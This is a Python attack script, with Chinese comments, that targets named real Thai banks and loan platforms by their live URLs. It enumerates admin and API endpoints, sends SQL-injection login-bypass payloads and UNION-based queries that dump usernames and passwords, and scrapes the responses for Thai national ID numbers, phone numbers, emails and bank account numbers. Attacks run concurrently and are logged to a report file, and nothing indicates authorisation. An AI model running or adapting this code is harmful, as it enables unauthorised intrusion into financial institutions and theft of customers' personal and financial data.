#!/usr/bin/env python3
"""
实时泰国贷款系统攻击
真实目标验证和数据提取
"""

import requests
import json
import time
import threading
import concurrent.futures
from datetime import datetime
import re
import urllib.parse
import random

class RealtimeThaiAttacks:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        })

        # 真实泰国贷款目标
        self.real_targets = [
            # 泰国银行
            {
                'name': 'Kasikornbank',
                'url': 'https://www.kasikornbank.com',
                'type': 'bank',
                'priority': 'high'
            },
            {
                'name': 'Siam Commercial Bank',
                'url': 'https://www.scb.co.th',
                'type': 'bank',
                'priority': 'high'
            },
            {
                'name': 'Krungsri Bank',
                'url': 'https://www.krungsri.com',
                'type': 'bank',
                'priority': 'high'
            },
            # 贷款平台
            {
                'name': 'MoneyCat',
                'url': 'https://www.moneycat.co.th',
                'type': 'loan_platform',
                'priority': 'critical'
            },
            {
                'name': 'KTC Credit',
                'url': 'https://www.ktc.co.th',
                'type': 'loan_platform',
                'priority': 'critical'
            },
            {
                'name': 'AEON Thana',
                'url': 'https://www.aeon.co.th',
                'type': 'loan_platform',
                'priority': 'critical'
            },
            {
                'name': 'NgernMun',
                'url': 'https://www.ngoenmun.com',
                'type': 'loan_platform',
                'priority': 'critical'
            },
            {
                'name': 'Darm',
                'url': 'https://www.darm.co.th',
                'type': 'loan_platform',
                'priority': 'high'
            },
            {
                'name': 'CashEA',
                'url': 'https://www.cashea.co.th',
                'type': 'loan_platform',
                'priority': 'high'
            },
            {
                'name': 'QuickLoan',
                'url': 'https://www.quickloan.co.th',
                'type': 'loan_platform',
                'priority': 'high'
            }
        ]

        self.results = []
        self.successful_attacks = []

    def test_target_connectivity(self, target):
        """测试目标连接性"""
        try:
            response = self.session.get(target['url'], timeout=10)
            return {
                'target': target,
                'status_code': response.status_code,
                'response_time': response.elapsed.total_seconds(),
                'content_length': len(response.content),
                'server': response.headers.get('Server', 'Unknown'),
                'accessible': response.status_code == 200
            }
        except Exception as e:
            return {
                'target': target,
                'error': str(e),
                'accessible': False
            }

    def discover_endpoints(self, target_info):
        """发现API端点和敏感路径"""
        if not target_info.get('accessible'):
            return []

        target = target_info['target']
        base_url = target['url']
        discovered = []

        # 常见的敏感端点
        sensitive_paths = [
            '/api/login',
            '/api/auth',
            '/api/users',
            '/api/loans',
            '/api/applications',
            '/admin',
            '/admin/login',
            '/api/admin',
            '/api/v1/auth',
            '/api/v2/users',
            '/rest/login',
            '/graphql',
            '/api/webhook',
            '/api/verify',
            '/api/application',
            '/api/customer',
            '/api/account'
        ]

        print(f"[*] Discovering endpoints for {target['name']}...")

        for path in sensitive_paths:
            try:
                url = base_url + path
                response = self.session.get(url, timeout=5)

                if response.status_code in [200, 201, 202, 301, 302]:
                    discovered.append({
                        'path': path,
                        'status_code': response.status_code,
                        'content_length': len(response.content),
                        'response_time': response.elapsed.total_seconds()
                    })
                    print(f"[+] Found endpoint: {path} ({response.status_code})")

            except Exception as e:
                continue

        return discovered

    def test_authentication_bypass(self, target_info, endpoints):
        """测试认证绕过"""
        if not target_info.get('accessible') or not endpoints:
            return []

        base_url = target_info['target']['url']
        bypass_results = []

        # 认证绕过载荷
        auth_payloads = [
            {'username': "admin' OR '1'='1'--", 'password': "anything"},
            {'username': "admin'/**/OR/**/1=1--", 'password': "password"},
            {'username': "' OR '1'='1'--", 'password': "admin"},
            {'username': "ทดสอบ' OR '1'='1", 'password': "123456"},
            {'username': "test@test.com'--", 'password': "admin"},
            {'email': "admin' OR '1'='1'--", 'password': "admin"},
            {'user': "' UNION SELECT 'admin','admin'--", 'pass': "admin"}
        ]

        # 尝试发现的登录端点
        login_endpoints = [ep for ep in endpoints if 'login' in ep['path'] or 'auth' in ep['path']]

        for endpoint in login_endpoints[:3]:  # 限制测试数量
            url = base_url + endpoint['path']

            for payload in auth_payloads:
                try:
                    response = self.session.post(url, data=payload, timeout=5, allow_redirects=False)

                    # 检查绕过成功的标志
                    if response.status_code in [200, 201, 302]:
                        if 'dashboard' in response.text.lower() or 'welcome' in response.text.lower():
                            bypass_results.append({
                                'endpoint': endpoint['path'],
                                'payload': payload,
                                'status_code': response.status_code,
                                'bypassed': True,
                                'evidence': 'Dashboard access detected'
                            })
                            print(f"[!] AUTH BYPASS SUCCESS: {endpoint['path']} with payload {payload}")
                            break
                        elif response.status_code != 401 and response.status_code != 403:
                            bypass_results.append({
                                'endpoint': endpoint['path'],
                                'payload': payload,
                                'status_code': response.status_code,
                                'bypassed': True,
                                'evidence': f'Unexpected response code: {response.status_code}'
                            })
                            print(f"[!] POTENTIAL BYPASS: {endpoint['path']} - Status: {response.status_code}")

                except Exception as e:
                    continue

        return bypass_results

    def test_sql_injection(self, target_info, endpoints):
        """测试SQL注入"""
        if not target_info.get('accessible') or not endpoints:
            return []

        base_url = target_info['target']['url']
        sql_results = []

        # SQL注入载荷
        sql_payloads = [
            "1' OR '1'='1",
            "1' UNION SELECT @@version--",
            "1' AND SLEEP(5)--",
            "ทดสอบ' OR '1'='1",
            "1'/**/UNION/**/SELECT/**/*",
            "' OR 1=CONVERT(int, (SELECT @@version))--"
        ]

        # 测试发现的端点
        for endpoint in endpoints[:2]:  # 限制测试数量
            if 'api' in endpoint['path']:
                url = base_url + endpoint['path']

                for payload in sql_payloads:
                    try:
                        # GET参数注入测试
                        test_url = f"{url}?id={urllib.parse.quote(payload)}"
                        response = self.session.get(test_url, timeout=5)

                        # 检查SQL错误
                        sql_errors = [
                            'mysql_fetch_array', 'mysql error', 'you have an error',
                            'ora-', 'microsoft ole db', 'warning: mysql',
                            'syntax error', 'sql syntax'
                        ]

                        if any(error in response.text.lower() for error in sql_errors):
                            sql_results.append({
                                'endpoint': endpoint['path'],
                                'payload': payload,
                                'method': 'GET',
                                'vulnerability': 'SQL Injection',
                                'evidence': 'SQL error detected'
                            })
                            print(f"[!] SQL INJECTION FOUND: {endpoint['path']} - {payload}")
                            break

                        # POST参数注入测试
                        post_data = {'id': payload, 'search': payload}
                        response = self.session.post(url, data=post_data, timeout=5)

                        if any(error in response.text.lower() for error in sql_errors):
                            sql_results.append({
                                'endpoint': endpoint['path'],
                                'payload': payload,
                                'method': 'POST',
                                'vulnerability': 'SQL Injection',
                                'evidence': 'SQL error detected'
                            })
                            print(f"[!] SQL INJECTION FOUND: {endpoint['path']} (POST) - {payload}")
                            break

                    except Exception as e:
                        continue

        return sql_results

    def extract_sensitive_data(self, target_info, vulnerabilities):
        """提取敏感数据"""
        if not vulnerabilities:
            return []

        base_url = target_info['target']['url']
        extracted_data = []

        for vuln in vulnerabilities:
            try:
                if vuln.get('bypassed') and 'login' in vuln.get('endpoint', ''):
                    # 尝试从被绕过的登录端点提取数据
                    data = self.extract_from_bypassed_login(base_url, vuln)
                    extracted_data.extend(data)

                elif vuln.get('vulnerability') == 'SQL Injection':
                    # 尝试从SQL注入提取数据
                    data = self.extract_from_sql_injection(base_url, vuln)
                    extracted_data.extend(data)

            except Exception as e:
                continue

        return extracted_data

    def extract_from_bypassed_login(self, base_url, vuln):
        """从被绕过的登录提取数据"""
        data = []

        try:
            # 尝试访问用户数据端点
            user_endpoints = [
                '/api/users',
                '/api/customers',
                '/api/accounts',
                '/admin/users',
                '/api/user/profile'
            ]

            for endpoint in user_endpoints:
                url = base_url + endpoint
                response = self.session.get(url, timeout=5)

                if response.status_code == 200:
                    # 尝试解析用户数据
                    try:
                        user_data = response.json()
                        sensitive_info = self.find_sensitive_info_in_data(user_data, endpoint)
                        data.extend(sensitive_info)
                    except:
                        # 在HTML中查找敏感信息
                        sensitive_info = self.find_sensitive_info_in_text(response.text, endpoint)
                        data.extend(sensitive_info)

        except Exception as e:
            pass

        return data

    def extract_from_sql_injection(self, base_url, vuln):
        """从SQL注入提取数据"""
        data = []

        try:
            # SQL注入数据提取载荷
            extraction_payloads = [
                "1' UNION SELECT database(),user(),version()--",
                "1' UNION SELECT table_name,null FROM information_schema.tables--",
                "1' UNION SELECT column_name,null FROM information_schema.columns WHERE table_name='users'--",
                "1' UNION SELECT username,password FROM users--"
            ]

            for payload in extraction_payloads:
                try:
                    test_url = f"{base_url}{vuln['endpoint']}?id={urllib.parse.quote(payload)}"
                    response = self.session.get(test_url, timeout=10)

                    if response.status_code == 200 and len(response.text) > 100:
                        # 查找敏感信息
                        sensitive_info = self.find_sensitive_info_in_text(response.text, 'sql_extraction')
                        data.extend(sensitive_info)

                except Exception as e:
                    continue

        except Exception as e:
            pass

        return data

    def find_sensitive_info_in_data(self, data, source):
        """在结构化数据中查找敏感信息"""
        sensitive_items = []

        # 敏感信息模式
        patterns = {
            'thai_id': r'\b\d{13}\b',
            'phone': r'\b0[689]\d{8}\b',
            'email': r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',
            'bank_account': r'\b\d{10,15}\b',
            'amount': r'\b\d{4,8}(?:,\d{3})*(?:\.\d{2})?\b'
        }

        def recursive_search(obj, path=""):
            if isinstance(obj, dict):
                for key, value in obj.items():
                    new_path = f"{path}.{key}"
                    if isinstance(value, str):
                        for data_type, pattern in patterns.items():
                            matches = re.findall(pattern, value)
                            for match in matches:
                                sensitive_items.append({
                                    'type': data_type,
                                    'value': match,
                                    'source': source,
                                    'path': new_path,
                                    'confidence': 'high'
                                })
                    else:
                        recursive_search(value, new_path)
            elif isinstance(obj, list):
                for i, item in enumerate(obj):
                    recursive_search(item, f"{path}[{i}]")

        recursive_search(data)
        return sensitive_items

    def find_sensitive_info_in_text(self, text, source):
        """在文本中查找敏感信息"""
        sensitive_items = []

        patterns = {
            'thai_id': r'\b\d{13}\b',
            'phone': r'\b0[689]\d{8}\b',
            'email': r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',
            'bank_account': r'\b\d{10,15}\b',
            'amount': r'\b\d{4,8}(?:,\d{3})*(?:\.\d{2})?\b'
        }

        for data_type, pattern in patterns.items():
            matches = re.findall(pattern, text)
            for match in matches:
                sensitive_items.append({
                    'type': data_type,
                    'value': match,
                    'source': source,
                    'path': 'text_content',
                    'confidence': 'medium'
                })

        return sensitive_items

    def attack_single_target(self, target):
        """攻击单个目标"""
        print(f"\n{'='*50}")
        print(f"ATTACKING: {target['name']} ({target['type']})")
        print(f"URL: {target['url']}")
        print(f"Priority: {target['priority']}")
        print(f"{'='*50}")

        result = {
            'target': target,
            'timestamp': datetime.now().isoformat(),
            'connectivity': None,
            'endpoints': [],
            'vulnerabilities': [],
            'extracted_data': [],
            'attack_success': False
        }

        # 1. 测试连接性
        print("[1/5] Testing connectivity...")
        connectivity = self.test_target_connectivity(target)
        result['connectivity'] = connectivity

        if not connectivity.get('accessible'):
            print(f"[-] Target not accessible: {connectivity.get('error', 'Unknown error')}")
            return result

        print(f"[+] Target accessible (Status: {connectivity['status_code']}, Time: {connectivity['response_time']:.2f}s)")

        # 2. 发现端点
        print("[2/5] Discovering endpoints...")
        endpoints = self.discover_endpoints(connectivity)
        result['endpoints'] = endpoints

        if not endpoints:
            print("[-] No accessible endpoints found")
            return result

        print(f"[+] Found {len(endpoints)} accessible endpoints")

        # 3. 测试认证绕过
        print("[3/5] Testing authentication bypass...")
        auth_bypasses = self.test_authentication_bypass(connectivity, endpoints)
        result['vulnerabilities'].extend(auth_bypasses)

        if auth_bypasses:
            print(f"[+] Found {len(auth_bypasses)} authentication bypasses")
            result['attack_success'] = True

        # 4. 测试SQL注入
        print("[4/5] Testing SQL injection...")
        sql_injections = self.test_sql_injection(connectivity, endpoints)
        result['vulnerabilities'].extend(sql_injections)

        if sql_injections:
            print(f"[+] Found {len(sql_injections)} SQL injection vulnerabilities")
            result['attack_success'] = True

        # 5. 提取敏感数据
        print("[5/5] Extracting sensitive data...")
        all_vulns = auth_bypasses + sql_injections
        if all_vulns:
            extracted = self.extract_sensitive_data(connectivity, all_vulns)
            result['extracted_data'] = extracted
            print(f"[+] Extracted {len(extracted)} sensitive data items")

        # 总结
        print(f"\n[+] Attack completed for {target['name']}")
        print(f"    - Success: {result['attack_success']}")
        print(f"    - Vulnerabilities: {len(result['vulnerabilities'])}")
        print(f"    - Data extracted: {len(result['extracted_data'])}")

        if result['attack_success']:
            self.successful_attacks.append(result)

        return result

    def run_concurrent_attacks(self):
        """运行并发攻击"""
        print("REALTIME THAI LOAN SYSTEM ATTACKS")
        print("=" * 50)
        print(f"Targets: {len(self.real_targets)}")
        print(f"Starting concurrent attacks...")
        print("=" * 50)

        start_time = time.time()

        # 使用线程池并发攻击
        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
            # 按优先级排序目标
            sorted_targets = sorted(self.real_targets, key=lambda x: (
                0 if x['priority'] == 'critical' else
                1 if x['priority'] == 'high' else 2
            ))

            # 提交所有攻击任务
            future_to_target = {
                executor.submit(self.attack_single_target, target): target
                for target in sorted_targets
            }

            # 收集结果
            for future in concurrent.futures.as_completed(future_to_target):
                target = future_to_target[future]
                try:
                    result = future.result()
                    self.results.append(result)
                except Exception as e:
                    print(f"[-] Attack failed for {target['name']}: {e}")

        # 生成攻击报告
        elapsed = time.time() - start_time
        self.generate_attack_report(elapsed)

    def generate_attack_report(self, elapsed_time):
        """生成攻击报告"""
        print(f"\n{'='*60}")
        print("ATTACK SUMMARY")
        print(f"{'='*60}")
        print(f"Total attack time: {elapsed_time:.2f} seconds")
        print(f"Targets attacked: {len(self.results)}")
        print(f"Successful attacks: {len(self.successful_attacks)}")
        print(f"Total vulnerabilities found: {sum(len(r['vulnerabilities']) for r in self.results)}")
        print(f"Total data extracted: {sum(len(r['extracted_data']) for r in self.results)}")

        # 统计信息
        vulnerable_targets = [r for r in self.results if r['vulnerabilities']]
        data_extraction_targets = [r for r in self.results if r['extracted_data']]

        print(f"\nVulnerable targets: {len(vulnerable_targets)}")
        print(f"Data extraction targets: {len(data_extraction_targets)}")

        # 高价值目标
        high_value_targets = []
        for result in self.successful_attacks:
            if result['target']['priority'] == 'critical':
                high_value_targets.append(result)

        print(f"\nHigh-value targets compromised: {len(high_value_targets)}")
        for target in high_value_targets:
            print(f"  - {target['target']['name']}: {len(target['vulnerabilities'])} vulns, {len(target['extracted_data'])} data items")

        # 保存详细报告
        report_data = {
            'attack_summary': {
                'total_time': elapsed_time,
                'targets_attacked': len(self.results),
                'successful_attacks': len(self.successful_attacks),
                'vulnerabilities_found': sum(len(r['vulnerabilities']) for r in self.results),
                'data_extracted': sum(len(r['extracted_data']) for r in self.results),
                'timestamp': datetime.now().isoformat()
            },
            'results': self.results,
            'successful_attacks': self.successful_attacks,
            'high_value_targets': high_value_targets
        }

        filename = f"realtime_thai_attacks_report_{int(time.time())}.json"
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(report_data, f, indent=2, ensure_ascii=False)

        print(f"\n[+] Detailed report saved: {filename}")
        print(f"[+] Ready for data validation and cleanup phase")

def main():
    attacker = RealtimeThaiAttacks()
    attacker.run_concurrent_attacks()

if __name__ == "__main__":
    main()